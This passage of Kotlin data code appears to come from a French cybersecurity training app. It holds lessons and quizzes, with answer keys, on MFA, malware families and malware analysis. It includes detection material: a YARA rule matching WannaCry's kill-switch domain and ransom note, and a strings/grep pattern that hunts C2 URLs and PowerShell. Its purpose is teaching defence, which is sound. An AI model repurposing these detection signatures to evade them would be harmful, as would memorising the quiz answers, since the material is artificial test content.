                    id = "q_sec_10_2",
                    question = "Quelle mesure simple bloque plus de 99% des attaques d'usurpation de compte ?",
                    codeSnippet = null,
                    options = listOf(
                        "Écrire son mot de passe sur un post-it",
                        "Activer l'Authentification Multi-Facteurs (MFA / 2FA)",
                        "Désactiver l'antivirus",
                        "Changer de nom d'utilisateur"
                    ),
                    correctIndex = 1,
                    explanation = "Le MFA exige une seconde preuve d'identité (code à usage unique, clé de sécurité), rendant un mot de passe volé inutile pour le pirate."
                )
            )
        ),

        // =========================================================================
        // LEÇON 11 : LES DIFFÉRENTS TYPES DE MALWARE & MENACES CYBER
        // =========================================================================
        CyberLesson(
            id = "sec_11_malware_types",
            number = 11,
            title = "11. Les Différents Types de Malware & Menaces Cyber",
            subtitle = "Ransomwares, Trojans, Vers, Spywares, Rootkits, Botnets et Malwares Fileless",
            level = CyberLevel.MALWARE_THREATS,
            durationMinutes = 15,
            xpReward = 120,
            summary = "Explorez l'arsenal des logiciels malveillants : comment ils fonctionnent, leurs vecteurs d'attaque dévastateurs et leurs différences fondamentales.",
            sections = listOf(
                LessonSection(
                    title = "1. Qu'est-ce qu'un Malware et comment s'infiltre-t-il ?",
                    content = """
Un **Malware** (contraction de *Malicious Software* ou logiciel malveillant) est tout programme conçu pour nuire, exploiter, espionner ou rançonner un appareil ou un réseau.

Les principaux vecteurs d'infection sont :
• **Hameçonnage (Phishing / Spear-Phishing)** : 90% des infections débutent par un e-mail trompeur incitant à ouvrir une pièce jointe piégée (.zip, .xlsm, .iso).
• **Failles logicielles non corrigées** : Exploitation de vulnérabilités connues (CVE) ou inconnues (0-Day) dans Windows, Linux, navigateurs ou serveurs VPN.
• **Supports amovibles piégés** : Clés USB infectées laissées volontairement dans un parking (*USB Drop Attack*) ou clés Rubber Ducky simulant un clavier à haute vitesse.
• **Attaques par chaîne logistique (Supply Chain)** : Piratage d'une mise à jour légitime d'un logiciel populaire (ex: affaire SolarWinds).
                    """.trimIndent(),
                    tip = "Ne branchez JAMAIS une clé USB inconnue trouvée par hasard sur votre machine de travail ou personnelle !"
                ),
                LessonSection(
                    title = "2. La Classification des Familles de Malware",
                    content = """
Voici les 8 grandes familles de malwares que tout expert doit impérativement maîtriser :

1. **Ransomwares (Rançongiciels)** :
   Chiffre de manière irréversible tous les documents de la victime avec des clés AES+RSA et exige une rançon en cryptomonnaies (Bitcoin, Monero).
   *Exemples majeurs :* WannaCry, LockBit, Conti, Ryuk.

2. **Chevaux de Troie (Trojans & RAT)** :
   Se dissimule sous l'apparence d'un utilitaire ou d'un crack de jeu inoffensif. Une fois lancé, il ouvre une porte dérobée (*Backdoor*) permettant à l'attaquant de contrôler l'ordinateur à distance.
   *Exemples :* Emotet, DarkComet, AgentTesla.

3. **Vers Informatiques (Worms)** :
   100% autonomes ! Contrairement aux virus, ils n'ont pas besoin de programme hôte ni d'action humaine pour se propager. Ils scannent le réseau et infectent d'autres machines vulnérables à la vitesse de l'éclair.
   *Exemples :* Stuxnet (sabotage nucléaire), ILOVEYOU, Conficker.

4. **Spywares (Logiciels Espions) & Keyloggers** :
   Espionnent la victime en toute discrétion : interception des frappes au clavier, capture d'écran, activation clandestine du micro et de la webcam.
   *Exemple emblématique :* Pegasus (NSO Group).

5. **Rootkits & Bootkits** :
   S'installent au niveau le plus profond : dans le noyau de l'OS (Kernel Ring 0) ou dans le BIOS/UEFI. Ils falsifient les commandes système pour être complètement invisibles pour les antivirus normaux.

6. **Botnets (Réseaux de Zombies)** :
   Armées de centaines de milliers d'appareils infectés (serveurs, PC, caméras connectées IoT) contrôlés par un serveur C2 (*Command & Control*) pour saturer des sites par attaques DDoS massives.
   *Exemple :* Mirai.

7. **Malwares Fileless (Sans Fichier)** :
   Résident uniquement en mémoire vive (RAM) et n'écrivent aucun fichier sur le disque dur. Ils détournent des outils légitimes (PowerShell, WMI) pour échapper aux analyses de signatures classiques.

8. **Bombes Logiques (Logic Bombs)** :
   Code dormant qui attend un événement ou une date précise pour se déclencher (ex: licenciement d'un employé) et effacer les serveurs.
                    """.trimIndent()
                ),
                LessonSection(
                    title = "3. La Règle d'Or de Défense Face aux Malwares",
                    content = """
Pour se prémunir efficacement contre les malwares modernes :
• **Sauvegardes 3-2-1** : 3 copies, 2 supports différents, dont 1 copie HORS LIGNE (Air-gapped) non connectée au réseau.
• **EDR (Endpoint Detection and Response)** : Remplace l'antivirus traditionnel en surveillant en direct le comportement anormal des processus en mémoire.
• **Principe du Moindre Privilège** : Ne jamais exécuter ses sessions quotidiennes avec un compte administrateur/root.
• **Mises à jour automatiques** : Corriger les failles avant qu'elles ne soient exploitées.
                    """.trimIndent()
                )
            ),
            quiz = listOf(
                QuizQuestion(
                    id = "q_sec_11_1",
                    question = "Quelle est la caractéristique distinctive d'un Ver informatique (Worm) par rapport à un virus classique ?",
                    codeSnippet = null,
                    options = listOf(
                        "Il ne fonctionne que sur les téléphones",
                        "Il se propage de manière 100% autonome sur le réseau sans nécessiter d'intervention humaine ou de fichier hôte",
                        "Il ne fait qu'afficher des publicités",
                        "Il est écrit obligatoirement en HTML"
                    ),
                    correctIndex = 1,
                    explanation = "Le ver informatique est autonome : il scanne et se propage d'ordinateur en ordinateur à travers le réseau sans avoir besoin qu'un utilisateur clique sur un exécutable."
                ),
                QuizQuestion(
                    id = "q_sec_11_2",
                    question = "Quel type de malware réside uniquement dans la mémoire vive (RAM) sans déposer de fichier binaire sur le disque dur ?",
                    codeSnippet = null,
                    options = listOf(
                        "Malware Fileless (Sans Fichier)",
                        "Macro Excel classique",
                        "Logiciel Adware",
                        "Script Batch"
                    ),
                    correctIndex = 0,
                    explanation = "Le malware Fileless s'exécute directement en RAM (souvent via PowerShell ou injection mémoire) pour contourner les antivirus traditionnels basés sur les fichiers."
                ),
                QuizQuestion(
                    id = "q_sec_11_3",
                    question = "Pourquoi un Rootkit de niveau noyau (Kernel) est-il particulièrement dangereux ?",
                    codeSnippet = null,
                    options = listOf(
                        "Il consomme toute la connexion 4G",
                        "Il fonctionne au niveau Ring 0 et peut tromper le système d'exploitation et l'antivirus pour masquer sa présence",
                        "Il est uniquement actif les week-ends",
                        "Il ne cible que les imprimantes"
                    ),
                    correctIndex = 1,
                    explanation = "Opérant au niveau noyau (Ring 0), le rootkit a les privilèges les plus élevés et peut intercepter les requêtes système pour effacer ses traces et rester invisible."
                )
            )
        ),

        // =========================================================================
        // LEÇON 12 : ANALYSE & FORENSICS DE MALWARE (STATION LAB)
        // =========================================================================
        CyberLesson(
            id = "sec_12_malware_analysis",
            number = 12,
            title = "12. Analyse & Forensics de Malwares",
            subtitle = "Analyse statique, extraction de chaînes, calcul de hash SHA-256 et Sandbox",
            level = CyberLevel.MALWARE_THREATS,
            durationMinutes = 14,
            xpReward = 130,
            summary = "Apprenez les méthodologies d'analyse de binaires suspects : hachage cryptographique, examen de chaînes et environnements Sandbox.",
            sections = listOf(
                LessonSection(
                    title = "1. Analyse Statique vs Analyse Dynamique",
                    content = """
Lorsqu'un analyste de sécurité découvre un fichier suspect, il dispose de deux grandes approches :

• **Analyse Statique (Sans exécuter le fichier)** :
  1. **Calcul du Hash (SHA-256)** : Donne l'empreinte numérique unique du fichier pour vérifier s'il est déjà référencé sur des bases mondiales de cybermenaces comme VirusTotal.
     `sha256sum payload.exe`
  2. **Extraction des chaînes de caractères (Strings)** : Recherche des URLs de serveurs de contrôle (C2), des adresses IP, des clés de registre ou des messages d'erreur laissés en clair dans le binaire.
     `strings payload.exe | grep -iE "(http|https|cmd|powershell)"`
  3. **Identification du type de fichier réel** : Vérifier que ce n'est pas un exécutable déguisé avec une fausse extension.
     `file rapport_confidentiel.pdf`

• **Analyse Dynamique (Dans un bac à sable / Sandbox isolée)** :
  Exécution du malware dans une machine virtuelle totalement déconnectée du réseau d'entreprise (ex: Cuckoo Sandbox, Any.Run) pour filmer et enregistrer chaque modification de fichier, connexion réseau et appel système.
                    """.trimIndent(),
                    tip = "N'exécutez JAMAIS un binaire suspect directement sur votre machine hôte ! Utilisez toujours un environnement virtuel cloisonné (Sandbox)."
                ),
                LessonSection(
                    title = "2. Les Règles YARA : L'Arme Secrète des Analystes",
                    content = """
Les **Règles YARA** sont considérées comme le 'couteau suisse' des chasseurs de malwares. Elles permettent de décrire des familles de malwares en combinant des motifs textuels ou hexadécimaux et des conditions logiques :

```yara
rule Detect_WannaCry_Pattern {
    meta:
        description = "Détection des signatures de WannaCry"
        author = "Anos Cyber Defense"
    strings:
        ${'$'}url = "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
        ${'$'}msg = "Ooops, your files have been encrypted!"
    condition:
        all of them
}
```
                    """.trimIndent()
                )
            ),
            quiz = listOf(
                QuizQuestion(
                    id = "q_sec_12_1",
                    question = "Quelle commande Linux permet d'extraire le texte lisible et les URLs dissimulés dans un fichier binaire suspect ?",
                    codeSnippet = null,
                    options = listOf(
                        "nmap -sV",
                        "strings <nom_du_fichier>",
                        "chmod 777",
                        "rm -rf"
                    ),
                    correctIndex = 1,
                    explanation = "La commande 'strings' extrait toutes les séquences de caractères imprimables d'un fichier binaire, révélant souvent des adresses IP, des noms de fichiers ou des clés."
                ),
                QuizQuestion(
                    id = "q_sec_12_2",
                    question = "Pourquoi calcule-t-on le hash SHA-256 d'un fichier suspect lors d'une analyse statique ?",
                    codeSnippet = null,
                    options = listOf(
                        "Pour accélérer la vitesse de téléchargement",
                        "Pour obtenir son empreinte numérique unique et la comparer aux bases de données mondiales de malwares (ex: VirusTotal)",
                        "Pour effacer le disque dur",
                        "Pour convertir le fichier en image PNG"
                    ),
                    correctIndex = 1,
                    explanation = "Le hash SHA-256 génère une empreinte unique de 64 caractères hexadécimaux permettant d'identifier immédiatement un malware connu sans avoir à l'exécuter."
                )
            )
        )
    )
}

